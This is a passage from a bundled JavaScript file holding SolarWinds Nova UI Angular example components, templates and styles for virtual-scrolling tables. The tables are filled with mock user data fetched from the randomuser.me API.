"gender",\n        "country",\n        "city",\n        "postcode",\n        "email",\n        "cell",\n    ];\n    public gridHeight = 400;\n    public makeSticky: boolean = true;\n    private dataSource: RandomuserTableDataSource;\n\n    constructor(\n        public selectorService: SelectorService,\n        private cd: ChangeDetectorRef\n    ) {\n        this.dataSource = new RandomuserTableDataSource();\n    }\n\n    @ViewChild(forwardRef(() => TableComponent), { static: false })\n    table: TableComponent<any>;\n    @ViewChild(forwardRef(() => TableVirtualScrollDirective), { static: false })\n    virtualDirective: TableVirtualScrollDirective;\n    @ViewChild(CdkVirtualScrollViewport, { static: false })\n    viewport: CdkVirtualScrollViewport;\n\n    public ngOnInit(): void {\n        this.dataSource.outputsSubject.subscribe(\n            (outputs: IFilteringOutputs) => {\n                if (outputs) {\n                    this.users = outputs.repeat.itemsSource;\n                    this._totalItems = outputs.totalItems;\n                    this.totalPages = Math.floor(this._totalItems / this.range);\n                    // This condition handles the case when the number of items fetched is less than the viewport size.\n                    // To have virtual scroll working, we need to prefetch the number of items missing to trigger the scrollbar.\n                    if (\n                        this.users.length <\n                        Math.round(\n                            this.viewport.getViewportSize() /\n                                this.virtualDirective.rowHeight\n                        )\n                    ) {\n                        this.prefetchedDsPageNumber++;\n                        this.dataSource.page = this.prefetchedDsPageNumber;\n                        this.dataSource.applyFilters();\n                    }\n                    this.cd.detectChanges();\n                }\n            }\n        );\n\n        this.dataSource.busy.subscribe((busy) => {\n            this._isBusy = busy;\n        });\n    }\n\n    public ngAfterViewInit(): void {\n        this.registerVirtualScroll();\n\n        // Setting the items range to properly evaluate the virtual scroll viewport size\n        this.virtualDirective.setMaxItems(this.range);\n\n        this.viewport.renderedRangeStream\n            .pipe(takeUntil(this.onDestroy$))\n            .subscribe((value) => {\n                // There is no use to proceed if we\'ve already fetched all the items\n                if (this.users.length === this._totalItems) {\n                    return;\n                }\n\n                const page = Math.floor(value.end / this.range);\n                if (page > this.lastPageFetched && page <= this.totalPages) {\n                    const start = page * this.range;\n                    const end = start + this.range;\n                    this.virtualScrollFilterValue = { start: start, end: end };\n                    this.lastPageFetched = page;\n                    // Due to a specificity of the chosen API, we explicitly send it the page number, because the API can\n                    // return data in pages. This can vary depending on the user\'s usecase\n                    this.dataSource.page = this.prefetchedDsPageNumber + page;\n\n                    this.dataSource.applyFilters();\n                }\n            });\n\n        this.dataSource.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.dataSource.busy.unsubscribe();\n        this.dataSource.outputsSubject.unsubscribe();\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n    }\n\n    private registerVirtualScroll() {\n        this.dataSource.registerComponent({\n            virtualScroll: {\n                componentInstance: {\n                    getFilters: () =>\n                        <IFilter<ListRange>>{\n                            type: "virtualScroll",\n                            value: this.virtualScrollFilterValue,\n                        },\n                },\n            },\n        });\n    }\n}\n'},61933:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div\n    [style.height.px]="gridHeight"\n    [style.max-width.px]="1300"\n    style="border-color: lightgrey"\n>\n    <cdk-virtual-scroll-viewport\n        [style.height.px]="gridHeight"\n        tableVirtualScroll\n        [rowHeight]="24"\n        [rowCount]="users.length"\n    >\n        <table\n            nui-table\n            [dataSource]="users"\n            [resizable]="false"\n            [reorderable]="true"\n        >\n            <ng-container nuiColumnDef="no" [columnWidth]="50">\n                <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.no }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameTitle" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Title</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameTitle }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameFirst" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>First Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameFirst }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameLast" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Last Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameLast }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="gender" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Gender</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.gender }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="country" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Country</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.country }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="city" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>City</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.city }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="postcode" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Postcode</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.postcode }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="email" [columnWidth]="200">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Email</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.email }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="cell" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Cell</th>\n                <td\n                    nui-cell\n                    *nuiCellDef="let element"\n                    style="overflow: visible"\n                >\n                    {{ element.cell }}\n                </td>\n            </ng-container>\n\n            <tr\n                nui-header-row\n                *nuiHeaderRowDef="displayedColumns; sticky: true"\n            ></tr>\n            <tr\n                nui-row\n                *nuiRowDef="let row; columns: displayedColumns"\n                density="tiny"\n            ></tr>\n        </table>\n    </cdk-virtual-scroll-viewport>\n</div>\n\n<footer\n    class="d-flex justify-content-center align-items-center nui-demo-scrolling-footer"\n>\n    <div class="h-100 w-100">\n        <div *ngIf="isBusy; else defaultText">\n            <nui-progress [show]="isBusy" compactMode="true"></nui-progress>\n            <div class="d-flex justify-content-center align-items-center">\n                Loading next {{ range }} items...\n            </div>\n        </div>\n        <ng-template #defaultText>\n            <div class="h-100 d-flex justify-content-center align-items-center">\n                Showing\n                <span class="px-2">{{ users.length }}</span>\n                of\n                <span class="pl-2">{{ totalItems }}</span>\n                <span *ngIf="users.length !== totalItems; else endOfData"\n                    >, scroll down for more.</span\n                >\n            </div>\n            <ng-template #endOfData\n                ><strong>. All items loaded.</strong></ng-template\n            >\n        </ng-template>\n    </div>\n</footer>\n'},97345:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-typography.less";\n@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n.nui-demo-scrolling-footer {\n    .setCssVariable(background-color, nui-color-bg-transparent);\n    .setCssVariable(color, nui-color-text-secondary);\n    height: 24px;\n    border: 1px solid;\n    .setCssVariable(border-color, nui-color-line-default);\n    max-width: 1285px;\n    .nui-text-small-secondary();\n}\n'},36313:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    OnDestroy,\n    OnInit,\n    ViewChild,\n} from "@angular/core";\nimport { Subject } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { filter, switchMap, takeUntil, tap } from "rxjs/operators";\n\nimport {\n    IFilteringOutputs,\n    SelectorService,\n    VirtualViewportManager,\n} from "@nova-ui/bits";\n\nimport { IRandomUserTableModel } from "../index";\nimport { RandomuserTableDataSource } from "../table-virtual-scroll-datasource";\n\n@Component({\n    selector: "nui-table-virtual-scroll-real-api-progress-text-footer-example",\n    templateUrl:\n        "./table-virtual-scroll-real-api-progress-text-footer.example.component.html",\n    styleUrls: [\n        "./table-virtual-scroll-real-api-progress-text-footer.example.component.less",\n    ],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n    providers: [VirtualViewportManager],\n})\nexport class TableVirtualScrollRealApiProgressTextFooterExampleComponent\n    implements AfterViewInit, OnDestroy, OnInit\n{\n    // The range of items to fetch from the server and display within the viewport.\n    public range: number = 40;\n\n    // This value is obtained from the server and used to evaluate the total number of pages to display\n    private _totalItems: number = 0;\n    private _isBusy: boolean = false;\n    private onDestroy$: Subject<void> = new Subject<void>();\n\n    get totalItems(): number {\n        return this._totalItems;\n    }\n\n    get isBusy(): boolean {\n        return this._isBusy;\n    }\n\n    // The dynamically changed array of items to render by the table\n    public users: IRandomUserTableModel[] = [];\n    public displayedColumns: string[] = [\n        "no",\n        "nameTitle",\n        "nameFirst",\n        "nameLast",\n        "gender",\n        "country",\n        "city",\n        "postcode",\n        "email",\n        "cell",\n    ];\n    public gridHeight = 400;\n    private dataSource: RandomuserTableDataSource;\n\n    constructor(\n        public selectorService: SelectorService,\n        private cd: ChangeDetectorRef,\n        private viewportManager: VirtualViewportManager\n    ) {\n        this.dataSource = new RandomuserTableDataSource();\n    }\n\n    @ViewChild(CdkVirtualScrollViewport, { static: false })\n    viewport: CdkVirtualScrollViewport;\n\n    public ngOnInit(): void {\n        this.dataSource.busy\n            .pipe(takeUntil(this.onDestroy$))\n            .subscribe((busy) => {\n                this._isBusy = busy;\n            });\n    }\n\n    public ngAfterViewInit(): void {\n        this.registerVirtualScroll();\n        this.viewportManager\n            // Note: Initializing viewportManager with the repeat\'s CDK Viewport Ref\n            .setViewport(this.viewport)\n            // Note: Initializing the stream with the desired page size, based on which\n            // VirtualViewportManager will perform the observations and will emit\n            // distinct ranges with step equal to provided pageSize\n            .observeNextPage$({ pageSize: this.range })\n            .pipe(\n                // Note: In case we know the total number of items we can stop the stream when dataset end is reached\n                // Otherwise we can let VirtualViewportManager to stop when last received page range will not match requested range\n                filter((range) =>\n                    this.totalItems ? this.totalItems >= range.end : true\n                ),\n                tap((range) => {\n                    // Note: Keeping backward compatibility with RandomuserTableDataSource which requires page number to be set by consumer\n                    // It also can be calculated directly on the Datasource level\n                    this.dataSource.page =\n                        range.end / (range.end - range.start);\n                    this.dataSource.applyFilters();\n                }),\n                // Note: Using the same stream to subscribe to the outputsSubject and update the items list\n                // eslint-disable-next-line import/no-deprecated\n                switchMap(() =>\n                    this.dataSource.outputsSubject.pipe(\n                        tap((outputs: IFilteringOutputs) => {\n                            this._totalItems = outputs.totalItems;\n                            this.users = outputs.repeat.itemsSource || [];\n                            this.cd.detectChanges();\n                        })\n                    )\n                ),\n                takeUntil(this.onDestroy$)\n            )\n            .subscribe();\n    }\n\n    public ngOnDestroy(): void {\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n    }\n\n    private registerVirtualScroll() {\n        this.dataSource.registerComponent({\n            virtualScroll: { componentInstance: this.viewportManager },\n        });\n    }\n}\n'},75431:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="mb-3">\n    <div class="row">\n        <div class="col-3">Sticky footer:</div>\n    </div>\n    <div class="row">\n        <div class="col-3">\n            <nui-switch [(value)]="makeSticky" i18n>\n                {{ makeSticky ? "Sticky" : "Not Sticky" }}\n            </nui-switch>\n        </div>\n    </div>\n</div>\n\n<div\n    [style.height.px]="gridHeight"\n    [style.max-width.px]="1300"\n    style="border-color: lightgrey"\n>\n    <cdk-virtual-scroll-viewport\n        [style.height.px]="gridHeight"\n        tableVirtualScroll\n        [rowHeight]="24"\n        [rowCount]="users.length"\n    >\n        <table\n            nui-table\n            [dataSource]="users"\n            [resizable]="false"\n            [reorderable]="true"\n        >\n            <ng-container nuiColumnDef="no" [columnWidth]="50">\n                <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.no }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameTitle" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Title</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameTitle }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameFirst" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>First Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameFirst }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="nameLast" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Last Name</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.nameLast }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="gender" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Gender</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.gender }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="country" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Country</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.country }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="city" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>City</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.city }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="postcode" [columnWidth]="100">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Postcode</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.postcode }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="email" [columnWidth]="200">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Email</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.email }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="cell" [columnWidth]="150">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Cell</th>\n                <td\n                    nui-cell\n                    *nuiCellDef="let element"\n                    style="overflow: visible"\n                >\n                    {{ element.cell }}\n                </td>\n            </ng-container>\n\n            <tr\n                nui-header-row\n                *nuiHeaderRowDef="displayedColumns; sticky: true"\n            ></tr>\n            <tr\n                nui-row\n                *nuiRowDef="let row; columns: displayedColumns"\n                density="tiny"\n            ></tr>\n        </table>\n\n        <div *ngIf="!makeSticky">\n            <ng-container *ngTemplateOutlet="footer"></ng-container>\n        </div>\n    </cdk-virtual-scroll-viewport>\n</div>\n\n<div *ngIf="makeSticky">\n    <ng-container *ngTemplateOutlet="footer"></ng-container>\n</div>\n\n<ng-template #footer>\n    <footer class="nui-demo-scrolling-footer">\n        <div class="h-100 w-100">\n            <div\n                *ngIf="isBusy; else defaultText"\n                class="d-flex justify-content-center align-items-center"\n            >\n                <nui-spinner\n                    class="mr-2 d-inline-flex"\n                    [show]="isBusy"\n                    size="small"\n                ></nui-spinner>\n                <span>Loading next {{ range }} items...</span>\n            </div>\n            <ng-template #defaultText>\n                <div\n                    class="h-100 d-flex justify-content-center align-items-center"\n                >\n                    Showing\n                    <span class="px-2">{{ users.length }}</span>\n                    of\n                    <span class="pl-2">{{ totalItems }}</span>\n                    <span *ngIf="users.length !== totalItems; else endOfData"\n                        >, scroll down for more.</span\n                    >\n                </div>\n                <ng-template #endOfData\n                    ><strong>. All items loaded.</strong></ng-template\n                >\n            </ng-template>\n        </div>\n    </footer>\n</ng-template>\n'},64595:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-typography.less";\n@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n.nui-demo-scrolling-footer {\n    .setCssVariable(background-color, nui-color-bg-transparent);\n    .setCssVariable(color, nui-color-text-secondary);\n    height: 24px;\n    border: 1px solid;\n    .setCssVariable(border-color, nui-color-line-default);\n    max-width: 1285px;\n    .nui-text-small-secondary();\n}\n'},74623:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    Injectable,\n    OnDestroy,\n    OnInit,\n    ViewChild,\n} from "@angular/core";\nimport { BehaviorSubject, Subject } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { filter, switchMap, takeUntil, tap } from "rxjs/operators";\n\nimport {\n    DataSourceService,\n    IFilteringOutputs,\n    INovaFilteringOutputs,\n    INovaFilters,\n    VirtualViewportManager,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-table-virtual-scroll-real-api-example",\n    templateUrl: "./table-virtual-scroll-real-api.example.component.html",\n    styleUrls: ["./table-virtual-scroll-real-api.example.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n    providers: [VirtualViewportManager],\n})\nexport class TableVirtualScrollRealApiExampleComponent\n    implements AfterViewInit, OnDestroy, OnInit\n{\n    @ViewChild(CdkVirtualScrollViewport, { static: false })\n    viewport: CdkVirtualScrollViewport;\n    // This value is obtained from the server and used to evaluate the total number of pages to display\n    private _totalItems: number = 0;\n    private _isBusy: boolean = false;\n    private dataSource: RandomuserTableDataSource;\n    private onDestroy$: Subject<void> = new Subject<void>();\n\n    get totalItems(): number {\n        return this._totalItems;\n    }\n\n    get isBusy(): boolean {\n        return this._isBusy;\n    }\n\n    // The range of items to fetch from the server and display within the viewport.\n    public range: number = 40;\n    // The dynamically changed array of items to render by the table\n    public users: IRandomUserTableModel[] = [];\n    public displayedColumns: string[] = [\n        "no",\n        "nameTitle",\n        "nameFirst",\n        "nameLast",\n        "gender",\n        "country",\n        "city",\n        "postcode",\n        "email",\n        "cell",\n    ];\n    public gridHeight = 400;\n    public makeSticky: boolean = true;\n\n    constructor(\n        private cd: ChangeDetectorRef,\n        private viewportManager: VirtualViewportManager\n    ) {\n        this.dataSource = new RandomuserTableDataSource();\n    }\n\n    public ngOnInit(): void {\n        this.dataSource.busy\n            .pipe(takeUntil(this.onDestroy$))\n            .subscribe((busy) => {\n                this._isBusy = busy;\n            });\n    }\n\n    public ngAfterViewInit(): void {\n        this.registerVirtualScroll();\n        this.viewportManager\n            // Note: Initializing viewportManager with the repeat\'s CDK Viewport Ref\n            .setViewport(this.viewport)\n            // Note: Initializing the stream with the desired page size, based on which\n            // VirtualViewportManager will perform the observations and will emit\n            // distinct ranges with step equal to provided pageSize\n            .observeNextPage$({ pageSize: this.range })\n            .pipe(\n                // Note: In case we know the total number of items we can stop the stream when dataset end is reached\n                // Otherwise we can let VirtualViewportManager to stop when last received page range will not match requested range\n                filter((range) =>\n                    this.totalItems ? this.totalItems >= range.end : true\n                ),\n                tap(async () => this.dataSource.applyFilters()),\n                // Note: Using the same stream to subscribe to the outputsSubject and update the items list\n                // eslint-disable-next-line import/no-deprecated\n                switchMap(() =>\n                    this.dataSource.outputsSubject.pipe(\n                        tap((outputs: IFilteringOutputs) => {\n                            this._totalItems = outputs.totalItems;\n                            this.users = outputs.repeat.itemsSource || [];\n                            this.cd.detectChanges();\n                        })\n                    )\n                ),\n                takeUntil(this.onDestroy$)\n            )\n            .subscribe();\n    }\n\n    public ngOnDestroy(): void {\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n    }\n\n    private registerVirtualScroll() {\n        this.dataSource.registerComponent({\n            virtualScroll: { componentInstance: this.viewportManager },\n        });\n    }\n}\n\n@Injectable()\nexport class RandomuserTableDataSource extends DataSourceService<IRandomUserTableModel> {\n    private readonly url = "https://randomuser.me/api";\n    private readonly seed = "sw";\n\n    private cache = Array.from<IRandomUserTableModel>({ length: 0 });\n    public busy = new BehaviorSubject(false);\n\n    public async getFilteredData(\n        filters: INovaFilters\n    ): Promise<INovaFilteringOutputs> {\n        this.busy.next(true);\n        const virtualScrollFilter =\n            filters.virtualScroll && filters.virtualScroll.value;\n        const start = virtualScrollFilter\n            ? filters.virtualScroll?.value.start\n            : 0;\n        const end = virtualScrollFilter ? filters.virtualScroll?.value.end : 0;\n\n        // We\'re returning Promise with setTimeout here to make the response from the server longer, as the API being used sends responses\n        // almost immediately. We need it longer to be able the show the spinner component on data load\n        return new Promise((resolve) => {\n            setTimeout(() => {\n                this.getData(start, end).then(\n                    (response: UsersQueryResponse | undefined) => {\n                        if (!response) {\n                            return;\n                        }\n\n                        this.cache = this.cache.concat(response.users);\n                        this.dataSubject.next(this.cache);\n                        resolve({\n                            repeat: {\n                                itemsSource: this.cache,\n                            },\n                            // This API can return thousands of results, however doesn\'t return the max number of results,\n                            // so we set the max number of result manually here.\n                            totalItems: 200,\n                            start: response.start,\n                        });\n                        this.busy.next(false);\n                    }\n                );\n            }, 2000);\n        });\n    }\n\n    public async getData(\n        start: number = 0,\n        end: number = 20\n    ): Promise<UsersQueryResponse | undefined> {\n        let response: IRandomUserResponse | undefined;\n        const delta: number = end - start;\n        try {\n            response = await (\n                await fetch(\n                    `${this.url}/?page=${end / delta}&results=${delta}&seed=${\n                        this.seed\n                    }`\n                )\n            ).json();\n            return {\n                users: response?.results.map(\n                    (result: IRandomUserResults, i: number) => ({\n                        no: this.cache.length + i + 1,\n                        nameTitle: result.name.title,\n                        nameFirst: result.name.first,\n                        nameLast: result.name.last,\n                        gender: result.gender,\n                        country: result.location.country,\n                        city: result.location.city,\n                        postcode: result.location.postcode,\n                        email: result.email,\n                        cell: result.cell,\n                    })\n                ),\n                total: response?.results.length,\n                start: start,\n            } as UsersQueryResponse;\n        } catch (e) {\n            console.error(\n                "Error responding from server. Please visit https://https://randomuser.me/ to see if it\'s available"\n            );\n        }\n    }\n}\n\nexport interface UsersQueryResponse {\n    users: IRandomUserTableModel[];\n    total: number;\n    start: number;\n}\n\nexport interface IRandomUserResponse {\n    info: Array<IRandomUserInfo>;\n    results: Array<IRandomUserResults>;\n}\n\nexport interface IRandomUserInfo {\n    page: number;\n    results: number;\n    seed: string;\n    version: string;\n}\n\nexport interface IRandomUserResults {\n    cell: string;\n    dob: {\n        age: number;\n        date: string;\n    };\n    email: string;\n    gender: string;\n    id: any;\n    location: IRandomUserLocation;\n    login: {\n        md5: string;\n        password: string;\n        salt: string;\n        sha1: string;\n        sha256: string;\n        username: string;\n        uuid: string;\n    };\n    name: {\n        title: string;\n        first: string;\n        last: string;\n    };\n    nat: string;\n    phone: string;\n    picture: {\n        large: string;\n        medium: string;\n        thumbnail: string;\n    };\n    registered: {\n        date: string;\n        age: number;\n    };\n}\n\nexport interface IRandomUserTableModel {\n    no: number;\n    nameTitle: string;\n    nameFirst: string;\n    nameLast: string;\n    gender: string;\n    country: string;\n    city: string;\n    postcode: number;\n    email: string;\n    cell: string;\n}\n\nexport interface IRandomUserLocation {\n    city: string;\n    coordinates: { latitude: string; longitude: string };\n    country: string;\n    postcode: number;\n    state: string;\n    street: { number: number; name: string };\n    timezone: any;\n}\n'},76016:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div [style.height.px]="400" [style.max-width.px]="1300">\n    <cdk-virtual-scroll-viewport\n        tableStickyHeader\n        class="h-100"\n        [itemSize]="itemSize"\n    >\n        \x3c!-- IMPORTANT Bind only visible rows to the table, otherwise, the table will render all rows in the DOM --\x3e\n        <table\n            nui-table\n            [dataSource]="visibleItems$ | async"\n            [trackBy]="trackByNo"\n            [sortable]="true"\n            [selectionConfig]="selectionConfig"\n            [(selection)]="selection"\n        >\n            \x3c!--         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  --\x3e\n            <ng-container\n                *ngFor="let column of displayedColumns"\n                [nuiColumnDef]="column"\n            >\n                <th nui-header-cell *nuiHeaderCellDef>{{ column }}</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element[column] }}\n                </td>\n            </ng-container>\n\n            <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n            \x3c!-- IMPORTANT The actual difference between normal table and virtualized one--\x3e\n            \x3c!--\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228\u2228 --\x3e\n            <ng-template\n                nuiRowDef\n                cdkVirtualFor\n                let-context\n                [nuiRowDefColumns]="displayedColumns"\n                [cdkVirtualForOf]="placeholderItems"\n                [cdkVirtualForTemplateCacheSize]="10"\n                [cdkVirtualForTrackBy]="trackByNo"\n            >\n                <tr nui-row [rowObject]="context"></tr>\n            </ng-template>\n            \x3c!-- ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ --\x3e\n        </table>\n    </cdk-virtual-scroll-viewport>\n</div>\n<br />\n{{ selection | json }}\n'},97872:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkVirtualScrollViewport } from "@angular/cdk/scrolling";\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    Component,\n    TrackByFunction,\n    ViewChild,\n} from "@angular/core";\nimport sample from "lodash/sample";\nimport { Observable } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { map, startWith, switchMap, tap } from "rxjs/operators";\n\nimport {\n    ClientSideDataSource,\n    IFilteringOutputs,\n    ISelection,\n    SelectionModel,\n    TableSelectionConfig,\n    TableSelectionMode,\n} from "@nova-ui/bits";\n\ninterface IRandomUserTableModel {\n    no: number;\n    nameFirst: string;\n    nameLast: string;\n    city: string;\n    postcode: number;\n}\n\n@Component({\n    selector: "nui-table-virtual-scroll-select-sticky-header-example",\n    templateUrl:\n        "./table-virtual-scroll-select-sticky-header-example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n    providers: [ClientSideDataSource],\n})\nexport class TableVirtualScrollSelectStickyHeaderExampleComponent\n    implements AfterViewInit\n{\n    @ViewChild(CdkVirtualScrollViewport)\n    public viewport: CdkVirtualScrollViewport;\n    // Note: Mock items list is used to fake that the data is already loaded\n    // and let CDK Viewport perform the scrolling on a known number of items\n    public placeholderItems: undefined[] = [];\n    public visibleItems$: Observable<IRandomUserTableModel[]>;\n    // The dynamically changed array of items to render by the table\n    public displayedColumns: string[] = [\n        "no",\n        "nameFirst",\n        "nameLast",\n        "city",\n        "postcode",\n    ];\n    public itemSize: number = 40;\n    public selection: ISelection = new SelectionModel({\n        include: [5],\n    });\n    public selectionConfig: TableSelectionConfig = {\n        enabled: true,\n        selectionMode: TableSelectionMode.Multi,\n    };\n\n    // trackBy handler used to identify uniquely 